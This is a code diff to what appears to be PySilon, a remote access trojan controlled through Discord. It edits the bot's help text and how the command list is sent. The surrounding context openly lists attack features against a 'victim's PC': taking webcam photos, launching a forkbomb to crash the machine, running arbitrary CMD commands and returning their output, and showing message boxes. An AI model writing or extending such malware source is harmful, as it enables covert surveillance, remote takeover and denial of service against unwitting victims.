@@ -410,7 +410,7 @@ help = {
         'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
         'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
         'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
-        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC (You must upload the file to the PySilon directory first).'],
+        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC.'],
         'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
         'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
         'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
@@ -464,11 +464,11 @@ async def on_message(message):
                     embed = discord.Embed(title='List of all available commands', color=0x49fc03)
                     for i in help['commands'].keys():
                         embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    await message.channel.send(embed=embed)
                     embed = discord.Embed(color=0x49fc03)
                     for i in help['commands2'].keys():
                         embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    await message.channel.send(embed=embed)
                     #.log Sent message with PySilon commands manual
                 
             elif message.content == '.set-critical':
